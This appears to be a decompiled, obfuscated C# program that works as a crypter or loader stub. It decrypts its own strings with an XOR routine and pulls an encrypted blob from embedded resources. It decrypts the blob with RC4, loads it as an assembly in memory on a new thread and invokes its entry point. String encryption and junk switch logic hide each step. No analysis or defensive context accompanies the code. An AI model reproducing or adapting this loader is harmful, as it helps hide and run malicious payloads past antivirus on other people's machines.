using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Threading;
using ns1;
using ns2;
using ns3;
using ns4;

namespace ns0;

internal sealed class Class0
{
	internal sealed class Class1
	{
		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 50)]
		private struct Struct0
		{
		}

		private static readonly char[] char_0;

		private static readonly char[] char_1;

		private static readonly string[] string_0;

		internal static Struct0 struct0_0/* Not supported: data(00 00 08 00 00 00 9B 16 7A 0A D3 01 9C 0C 2F 0C FE 01 1C 22 69 1A 01 00 04 00 00 00 52 0A CE 01 95 0C 38 0C 02 00 04 00 00 00 F7 01 98 0C 2E 0C E3 01) */;

		private static bool bool_0;

		static Class1()
		{
			char_1 = new char[25]
			{
				'\0', '\b', '\0', '᚛', '\u0a7a', 'Ǔ', 'ಜ', 'య', 'Ǿ', '∜',
				'\u1a69', '\u0001', '\u0004', '\0', '\u0a52', 'ǎ', 'ಕ', 'స', '\u0002', '\u0004',
				'\0', 'Ƿ', 'ಘ', 'మ', 'ǣ'
			};
			char[] array = new char[8];
			array[6] = '≽';
			array[1] = 'ਔ';
			array[3] = '\u0cf9';
			array[7] = 'ᨅ';
			array[0] = 'ᛲ';
			array[2] = 'Ƨ';
			array[4] = '\u0c5d';
			array[5] = 'Ɛ';
			string_0 = new string[3];
			char_0 = array;
		}

		internal static string smethod_0(int int_0, int int_1)
		{
			int num = int_0 ^ 0x68B71A59 ^ int_1;
			char[] array = char_1;
			int num2 = array[num];
			string result;
			if ((result = string_0[num2]) != null)
			{
				return result;
			}
			int num3 = array[num + 1];
			num3 = (int)((uint)array[num + 2] << 16) + num3;
			char[] array2 = new char[num3];
			char[] array3 = char_0;
			int num4 = array3.Length;
			num += 3;
			for (int num5 = 0; num5 < num3; num5 = 1 + num5)
			{
				array2[num5] = (char)(array[num + num5] ^ array3[(num5 + num2) % num4]);
			}
			result = new string(array2);
			string_0[num2] = result;
			return result;
		}

		internal static void smethod_1()
		{
			if (bool_0)
			{
				return;
			}
			Type typeFromHandle;
			Class5.smethod_1(typeFromHandle = typeof(Class1), 704, 695);
			try
			{
				if (!bool_0)
				{
					bool_0 = true;
					Class6.Class7.smethod_0(Class6.smethod_0(485, 430), Class2.Class3.smethod_1, 944, 971);
				}
			}
			finally
			{
				Class5.smethod_1(typeFromHandle, 880, 776);
			}
		}

		internal static int smethod_2(Stream stream_0, byte[] byte_0, int int_0, int int_1, int int_2, int int_3)
		{
			while (true)
			{
				switch (int_3 ^ int_2)
				{
				case 44:
					return Class6.Class7.Class8.smethod_2(stream_0, byte_0, int_0, int_1, 942, 941);
				}
			}
		}

		internal static string[] smethod_3(Assembly assembly_0, int int_0, int int_1)
		{
			while (true)
			{
				switch (int_1 ^ int_0)
				{
				case 28:
					return Class6.Class7.Class8.smethod_4(assembly_0, 376, 338);
				}
			}
		}
	}

	[STAThread]
	private static void Main(string[] args)
	{
		if (Class12.smethod_0())
		{
			Class1.smethod_1();
			ResourceManager resourceManager_ = new ResourceManager(Class1.smethod_0(1756830303, 6), Class2.Class3.smethod_3(463, 492));
			byte[] byte_ = (byte[])Class2.Class3.smethod_4(resourceManager_, Class1.smethod_0(1756830294, 4), 137, 134);
			byte[] object_ = smethod_0(byte_, (byte[])Class2.Class3.smethod_4(resourceManager_, Class1.smethod_0(1756830283, 0), 285, 274));
			Thread thread_ = new Thread(smethod_1);
			Class6.Class7.smethod_3(thread_, ApartmentState.STA, 579, 556);
			Class6.Class7.smethod_4(thread_, bool_0: false, 618, 584);
			Class6.smethod_3(thread_, object_, 366, 346);
		}
	}

	private static byte[] smethod_0(byte[] byte_0, byte[] byte_1)
	{
		uint num = 0u;
		uint num2 = 0u;
		uint num3 = 0u;
		uint[] array = new uint[256];
		for (num = 0u; num <= 255; num++)
		{
			array[num] = (byte)num;
		}
		for (num = 0u; num <= 255; num++)
		{
			num2 = (num2 + byte_1[(long)num % (long)byte_1.Length] + array[num]) & 0xFFu;
			num3 = array[num];
			array[num] = array[num2];
			array[num2] = (byte)num3;
		}
		num = 0u;
		num2 = 0u;
		for (int i = 0; i <= byte_0.Length - 1; i++)
		{
			num = (num + 1) & 0xFFu;
			num2 = (num2 + array[num]) & 0xFFu;
			num3 = array[num];
			array[num] = array[num2];
			array[num2] = (byte)num3;
			byte_0[i] ^= (byte)array[(array[num] + array[num2]) & 0xFF];
		}
		return byte_0;
	}

	private static void smethod_1(object object_0)
	{
		try
		{
			Assembly assembly_ = Class2.Class4.smethod_0((byte[])object_0, 433, 396);
			if (Class2.Class3.smethod_5(Class2.Class4.smethod_1(assembly_, 482, 477), 736, 655).Length > 0)
			{
				Class2.smethod_0(Class2.Class4.smethod_1(assembly_, 900, 955), null, new object[1] { Class2.Class3.smethod_6(116, 120) }, 341, 283);
			}
			else
			{
				Class6.Class7.smethod_5(Class6.smethod_2(assembly_, 868, 853), null, null, 376, 351);
			}
		}
		catch (Exception exception_)
		{
			Class6.Class7.Class9.smethod_4(Class6.Class7.Class8.smethod_5(exception_, 552, 548), 786, 855);
			Class6.Class7.Class9.Class10.smethod_0(349, 374);
		}
	}

	static Class0()
	{
		Class1.smethod_1();
	}

	internal static object smethod_2(AppDomain appDomain_0, string string_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 56:
				return Class6.Class7.Class8.smethod_0(appDomain_0, string_0, 108, 124);
			}
		}
	}
}
